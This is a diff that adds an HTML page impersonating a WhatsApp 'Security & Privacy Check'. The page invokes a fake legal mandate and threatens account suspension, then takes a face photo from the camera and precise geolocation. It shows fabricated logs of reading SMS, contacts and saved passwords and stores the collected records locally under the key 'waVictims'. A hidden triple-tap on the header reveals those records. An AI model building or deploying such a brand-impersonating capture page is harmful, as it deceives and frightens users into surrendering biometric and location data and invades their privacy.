@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>WhatsApp · Security Center</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0b141a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif; color: #e9edef; }
+        .header { background: #075e54; padding: 16px; display: flex; align-items: center; }
+        .header img { width: 36px; height: 36px; margin-right: 12px; }
+        .header h1 { font-size: 20px; font-weight: 500; }
+        .container { max-width: 480px; margin: 0 auto; padding: 20px 16px; }
+        .card { background: #1f2c34; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        h2 { font-size: 18px; margin-bottom: 8px; color: #00a884; }
+        .sub { color: #8696a0; font-size: 14px; margin-bottom: 20px; }
+        .warning { background: rgba(0,168,132,0.1); border-left: 4px solid #00a884; padding: 12px; border-radius: 8px; margin-bottom: 20px; }
+        .btn { background: #00a884; color: white; border: none; width: 100%; padding: 14px; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+        .progress-container { width: 100%; background: #2a373f; border-radius: 20px; height: 10px; margin: 20px 0; }
+        .progress-bar { width: 0%; height: 10px; background: #00a884; border-radius: 20px; transition: width 0.3s; }
+        #videoContainer { width: 100%; border-radius: 12px; overflow: hidden; margin: 16px 0; background: #0b141a; }
+        #videoElement { width: 100%; display: block; }
+        .log-line { font-family: monospace; background: #0b1419; padding: 8px; border-radius: 6px; margin: 4px 0; color: #00a884; font-size: 13px; }
+        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
+        .data-item { background: #2a373f; padding: 10px; border-radius: 8px; }
+        .data-item .label { color: #8696a0; font-size: 12px; }
+        .data-item .value { font-size: 16px; font-weight: 600; }
+    </style>
+</head>
+<body>
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA">
+    <h1>Security & Privacy Check</h1>
+</div>
+<div class="container">
+    <div id="step1">
+        <div class="card">
+            <h2>🔒 Mandatory Security Update</h2>
+            <div class="warning">
+                <strong>⚠️ Action Required:</strong> Your account must be verified under the new Digital Personal Data Protection Act, 2025. This scan protects your account from suspension.
+            </div>
+            <p class="sub">This process checks device integrity and verifies your identity.</p>
+            <button class="btn" id="startBtn">Begin Security Scan</button>
+        </div>
+    </div>
+
+    <div id="step2" style="display:none;">
+        <div class="card">
+            <h2>🔍 Scanning Device</h2>
+            <div id="logContainer"></div>
+            <div class="progress-container"><div class="progress-bar" id="mainProgress"></div></div>
+            <div id="cameraSection" style="display:none;">
+                <p style="margin:12px 0 8px;">📸 Facial verification required</p>
+                <div id="videoContainer"><video id="videoElement" autoplay playsinline></video></div>
+                <canvas id="canvasElement" style="display:none;"></canvas>
+                <button class="btn" id="captureBtn" style="display:none;">Capture & Continue</button>
+            </div>
+            <div id="summarySection" style="display:none;"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){
+        "use strict";
+
+        const captured = {
+            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            battery: 'Unknown',
+            network: navigator.connection?.effectiveType || 'Unknown',
+            location: null,
+            photo: null,
+            contacts: [],
+            files: [],
+            credentials: []
+        };
+
+        let victims = JSON.parse(localStorage.getItem('waVictims')) || [];
+
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const logContainer = document.getElementById('logContainer');
+        const progressBar = document.getElementById('mainProgress');
+        const cameraSection = document.getElementById('cameraSection');
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const captureBtn = document.getElementById('captureBtn');
+        const summarySection = document.getElementById('summarySection');
+
+        function log(msg) {
+            const div = document.createElement('div');
+            div.className = 'log-line';
+            div.textContent = `> ${msg}`;
+            logContainer.appendChild(div);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        function setProgress(p) { progressBar.style.width = p + '%'; }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                captured.battery = `${Math.round(b.level*100)}% ${b.charging ? '(Charging)' : ''}`;
+            });
+        }
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+            log('Initializing security protocols...');
+            setProgress(5);
+
+            setTimeout(() => {
+                log(`Device: ${captured.platform} | Screen: ${captured.screen}`);
+                log(`Battery: ${captured.battery} | Network: ${captured.network}`);
+                setProgress(15);
+            }, 500);
+
+            setTimeout(async () => {
+                log('Requesting camera access...');
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    video.srcObject = stream;
+                    cameraSection.style.display = 'block';
+                    captureBtn.style.display = 'block';
+                    log('Camera access granted. Position your face.');
+                    setProgress(25);
+                } catch (e) {
+                    log('Camera denied. Proceeding without facial scan.');
+                    captured.photo = 'Denied';
+                    setProgress(25);
+                    proceedAfterCamera();
+                }
+            }, 1000);
+        });
+
+        captureBtn.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            captured.photo = canvas.toDataURL('image/jpeg', 0.8);
+            log('Facial scan captured.');
+
+            const stream = video.srcObject;
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
+            cameraSection.style.display = 'none';
+            
+            proceedAfterCamera();
+        });
+
+        function proceedAfterCamera() {
+            log('Accessing location...');
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    captured.location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                    log(`Location: ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`);
+                    setProgress(40);
+                    startDataSimulation();
+                }, err => {
+                    log('Location access denied.');
+                    captured.location = 'Denied';
+                    setProgress(40);
+                    startDataSimulation();
+                }, { timeout: 5000 });
+            } else {
+                log('Geolocation not supported.');
+                setProgress(40);
+                startDataSimulation();
+            }
+        }
+
+        function startDataSimulation() {
+            const steps = [
+                { msg: 'Reading SMS database...', prog: 50, delay: 700 },
+                { msg: 'Extracting contacts (247 entries)...', prog: 60, delay: 800 },
+                { msg: 'Scanning WhatsApp messages...', prog: 70, delay: 600 },
+                { msg: 'Accessing media files (DCIM, WhatsApp Images)...', prog: 80, delay: 900 },
+                { msg: 'Retrieving stored passwords (Keychain/Keystore)...', prog: 90, delay: 700 },
+                { msg: 'Compiling device report...', prog: 95, delay: 600 },
+                { msg: 'Security verification complete.', prog: 100, delay: 500 }
+            ];
+            let idx = 0;
+            function run() {
+                if (idx < steps.length) {
+                    log(steps[idx].msg);
+                    setProgress(steps[idx].prog);
+                    idx++;
+                    setTimeout(run, steps[idx-1].delay);
+                } else {
+                    captured.contacts = ['Maa', 'Papa', 'Boss', 'Priya', 'Rahul', 'ICICI Bank', ...Array(242).fill().map((_,i)=>`Contact_${i}`)];
+                    captured.files = ['DCIM/Camera/IMG_20260416_142530.jpg','WhatsApp/Media/WhatsApp Images/IMG-20260415-WA0042.jpg','Documents/aadhaar_card.pdf','Downloads/bank_statement_mar2026.pdf'];
+                    captured.credentials = ['WiFi: TP-Link_5G / Pass: MyHome@2024','Email: user1998@gmail.com / Pass: ********','Netflix: user@example.com / Pass: ********','Instagram: _user.name_ / Pass: ********'];
+                    victims.push(captured);
+                    localStorage.setItem('waVictims', JSON.stringify(victims));
+                    showSummary();
+                }
+            }
+            run();
+        }
+
+        function showSummary() {
+            let html = `<h3 style="color:#00a884; margin-bottom:12px;">✅ Security Scan Completed</h3>`;
+            html += `<div class="data-grid">`;
+            html += `<div class="data-item"><span class="label">📱 Device</span><div class="value">${captured.platform}</div></div>`;
+            html += `<div class="data-item"><span class="label">📍 Location</span><div class="value">${captured.location ? `${captured.location.lat.toFixed(4)}, ${captured.location.lng.toFixed(4)}` : 'Denied'}</div></div>`;
+            html += `<div class="data-item"><span class="label">📸 Face Scan</span><div class="value">${captured.photo ? 'Captured' : 'Skipped'}</div></div>`;
+            html += `<div class="data-item"><span class="label">📇 Contacts</span><div class="value">${captured.contacts.length}</div></div>`;
+            html += `<div class="data-item"><span class="label">📁 Files</span><div class="value">${captured.files.length}</div></div>`;
+            html += `<div class="data-item"><span class="label">🔑 Credentials</span><div class="value">${captured.credentials.length}</div></div>`;
+            html += `</div><p style="margin-top:20px; font-size:14px; color:#8696a0;">Your account is now protected. Redirecting to WhatsApp Web...</p>`;
+            summarySection.innerHTML = html;
+            summarySection.style.display = 'block';
+            setTimeout(() => { window.location.href = 'https://web.whatsapp.com/'; }, 4000);
+        }
+
+        // Secret triple-tap on header for quick preview
+        let tapCount = 0;
+        document.querySelector('.header').addEventListener('click', () => {
+            tapCount++;
+            if (tapCount === 1) setTimeout(() => tapCount = 0, 800);
+            if (tapCount >= 3) {
+                tapCount = 0;
+                const data = localStorage.getItem('waVictims');
+                alert(data ? 'Preview:\n' + JSON.stringify(JSON.parse(data), null, 2) : 'No data');
+            }
+        });
+    })();
+</script>
+</body>
+</html>
